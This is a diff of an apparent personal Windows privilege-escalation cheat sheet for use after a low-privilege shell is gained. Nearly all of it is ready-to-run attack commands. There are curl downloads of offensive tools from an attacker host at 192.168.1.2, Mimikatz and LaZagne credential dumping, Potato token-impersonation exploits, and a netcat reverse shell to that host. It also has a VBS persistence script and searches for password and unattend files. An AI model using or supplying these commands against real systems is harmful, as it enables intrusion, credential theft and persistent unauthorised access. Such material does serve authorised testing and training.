@@ -1,4 +1,137 @@
-### Windows Priv-Esc Enumeration Flow (Post-Low-Priv Shell)
+WinPEASx64.exe  
+Description: Automated enum for priv esc vectors (services, configs, creds).  
+Curl Command: curl http://192.168.1.2/winPEASx64.exe -o C:\Users\Public\winPEASx64.exe  
+Example Usage: .\winPEASx64.exe | tee output.txt  
+
+PowerUp.ps1  
+Description: PS script for misconfigs (weak services, paths).  
+Curl Command: curl http://192.168.1.2/PowerUp.ps1 -o C:\Users\Public\PowerUp.ps1  
+Example Usage: powershell -ep bypass -f .\PowerUp.ps1  
+
+Seatbelt.exe  
+Description: .NET tool for security configs (policies, hotfixes).  
+Curl Command: curl http://192.168.1.2/Seatbelt.exe -o C:\Users\Public\Seatbelt.exe  
+Example Usage: .\Seatbelt.exe --csv  
+
+SharpUp.exe  
+Description: C# PowerUp port for fast enum.  
+Curl Command: curl http://192.168.1.2/SharpUp.exe -o C:\Users\Public\SharpUp.exe  
+Example Usage: .\SharpUp.exe --all  
+
+PrivescCheck.ps1  
+Description: Quick PS enum for privileges/services/vulns.  
+Curl Command: curl http://192.168.1.2/PrivescCheck.ps1 -o C:\Users\Public\PrivescCheck.ps1  
+Example Usage: powershell -ep bypass -f .\PrivescCheck.ps1  
+
+Mimikatz.exe  
+Description: Dumps creds (LSASS, hashes, tickets).  
+Curl Command: curl http://192.168.1.2/mimikatz.exe -o C:\Users\Public\mimikatz.exe  
+Example Usage: .\mimikatz.exe "sekurlsa::logonpasswords" exit  
+
+LaZagne.exe  
+Description: Recovers pwds from browsers/apps/files.  
+Curl Command: curl http://192.168.1.2/LaZagne.exe -o C:\Users\Public\LaZagne.exe  
+Example Usage: .\LaZagne.exe all  
+
+Sherlock.exe  
+Description: C# enum for priv esc opportunities.  
+Curl Command: curl http://192.168.1.2/Sherlock.exe -o C:\Users\Public\Sherlock.exe  
+Example Usage: .\Sherlock.exe  
+
+JAWS.ps1  
+Description: PS tool for deep Windows enum/priv esc checks.  
+Curl Command: curl http://192.168.1.2/JAWS.ps1 -o C:\Users\Public\JAWS.ps1  
+Example Usage: powershell -ep bypass -f .\JAWS.ps1  
+
+WindowsEnum.ps1  
+Description: Comprehensive PS enum script.  
+Curl Command: curl http://192.168.1.2/WindowsEnum.ps1 -o C:\Users\Public\WindowsEnum.ps1  
+Example Usage: powershell -ep bypass -f .\WindowsEnum.ps1  
+
+accesschk.exe  
+Description: Sysinternals: Checks file/registry/service perms.  
+Curl Command: curl http://192.168.1.2/accesschk.exe -o C:\Users\Public\accesschk.exe  
+Example Usage: .\accesschk.exe -uwcqv users C:\  
+
+psexec.exe  
+Description: Sysinternals: Runs processes as SYSTEM/other users.  
+Curl Command: curl http://192.168.1.2/psexec.exe -o C:\Users\Public\psexec.exe  
+Example Usage: .\psexec.exe -s cmd.exe  
+
+procmon.exe  
+Description: Sysinternals: Monitors file/registry activity for hijacks.  
+Curl Command: curl http://192.168.1.2/procmon.exe -o C:\Users\Public\procmon.exe  
+Example Usage: .\procmon.exe /acceptEula /minimized  
+
+JuicyPotato.exe  
+Description: Exploits SeImpersonate for token manip.  
+Curl Command: curl http://192.168.1.2/JuicyPotato.exe -o C:\Users\Public\JuicyPotato.exe  
+Example Usage: .\JuicyPotato.exe -l 135 -p C:\Windows\System32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}  
+
+RoguePotato.exe  
+Description: Advanced impersonation exploit (post-Juicy).  
+Curl Command: curl http://192.168.1.2/RoguePotato.exe -o C:\Users\Public\RoguePotato.exe  
+Example Usage: .\RoguePotato.exe -cmd "cmd.exe" -l 11000  
+
+PrintSpoofer.exe  
+Description: Abuses spooler for priv esc via impersonation.  
+Curl Command: curl http://192.168.1.2/PrintSpoofer.exe -o C:\Users\Public\PrintSpoofer.exe  
+Example Usage: .\PrintSpoofer.exe -i -c "cmd.exe" -sp 10.0.0.1  
+
+HotPotato.exe  
+Description: NTLM relay/spoofing for priv esc.  
+Curl Command: curl http://192.168.1.2/HotPotato.exe -o C:\Users\Public\HotPotato.exe  
+Example Usage: .\HotPotato.exe -install -param "cmd.exe"  
+
+GodPotato.exe  
+Description: Token manip with SeAssignPrimaryToken.  
+Curl Command: curl http://192.168.1.2/GodPotato.exe -o C:\Users\Public\GodPotato.exe  
+Example Usage: .\GodPotato.exe -cmd "cmd.exe"  
+
+nc.exe  
+Description: Netcat for reverse shells/port fwd.  
+Curl Command: curl http://192.168.1.2/nc.exe -o C:\Users\Public\nc.exe  
+Example Usage: .\nc.exe -e cmd.exe 192.168.1.2 4444  
+
+plink.exe  
+Description: PuTTY for SSH tunneling/port fwd.  
+Curl Command: curl http://192.168.1.2/plink.exe -o C:\Users\Public\plink.exe  
+Example Usage: .\plink.exe -L 8080:localhost:80 user@192.168.1.2  
+
+SharpHound.exe  
+Description: Collects AD data for BloodHound graph analysis.  
+Curl Command: curl http://192.168.1.2/SharpHound.exe -o C:\Users\Public\SharpHound.exe  
+Example Usage: .\SharpHound.exe --CollectionMethod All  
+
+Rubeus.exe  
+Description: Kerberos abuse (ASREPRoast, tickets).  
+Curl Command: curl http://192.168.1.2/Rubeus.exe -o C:\Users\Public\Rubeus.exe  
+Example Usage: .\Rubeus.exe asreproast /user:target  
+
+Watson.exe  
+Description: Enum Kerberoasting/priv esc in AD.  
+Curl Command: curl http://192.168.1.2/Watson.exe -o C:\Users\Public\Watson.exe  
+Example Usage: .\Watson.exe -k /domain:lab.local  
+
+CreateShortcut.vbs  
+Description: VBS for startup persistence/shortcuts.  
+Curl Command: curl http://192.168.1.2/CreateShortcut.vbs -o C:\Users\Public\CreateShortcut.vbs  
+Example Usage: cscript CreateShortcut.vbs "C:\Windows\System32\cmd.exe" "C:\Users\Public\shortcut.lnk"
+
+=======================================================================================================================================
+===============
+===============
+========
+======
+======================================================================================================================================================
+======================================================================================================================================================
+======
+========
+===============
+===============
+=======================================================================================================================================
+
+### Windows Manual Priv-Esc Enumeration Flow (Post-Low-Priv Shell)
 
 whoami /all     # current user, SIDs, groups, privileges, and integrity level
 whoami /priv    # SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, SeRestorePrivilege, SeLoadDriverPrivilege, SeManageVolumePrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeSystemEnvironmentPrivilege, SeShutdownPrivilege, SeEnableDelegationPrivilege, SeCreateTokenPrivilege
@@ -26,6 +159,10 @@ systeminfo > sysinfo.txt    # Dump systeminfo to file and review in Windows-Expl
   python3 wes.py systeminfo.txt -i "Elevation Privilege"    #Filter for Priv Esc vectors only
   python3 wes.py systeminfo.txt --output vulns.csv    # Determine vulnerabilities and output to file 
   python3 wes.py systeminfo.txt --exploits-only    #  List only vulnerabilities with exploits
+sc qc <service_name>    # Check service config
+accesschk.exe -ucqv <service_name>    # (from Sysinternals) to verify permissions. 
+icacls <path>    # Look for writable paths
+
 
 ipconfig /all  # Full network config, including DNS servers (might resolve internal names).
 route print    # Routing table; look for other subnets.
@@ -39,6 +176,7 @@ net session    # net session
 
 findstr /sim password *.txt *.ini *.config *.xml /C:"password"    # Recursive search for "password" in files
 findstr /si password C:\Users\*    # Searches all files in C:\Users\ and subdirectories for the string "password" (case-insensitive, recursive). Outputs matching lines with file paths.
+https://github.com/R031NF1NCH/0/blob/main/Windows%20Stuff/Priv%20Esc/File%20Search    # More Search Commands
 dir /s /b *pass*   #  Lists full paths of files matching "pass" recursively from C:\. Swap cred for other interesting words, ie *vnc*, *unattend*, *.config*, *cred* 
   type C:\Windows\Panther\Unattend.xml  # Unattended install files with encoded creds (base64 decode passwords).
   type C:\sysprep.inf  # Unattended install files with encoded creds (base64 decode passwords).
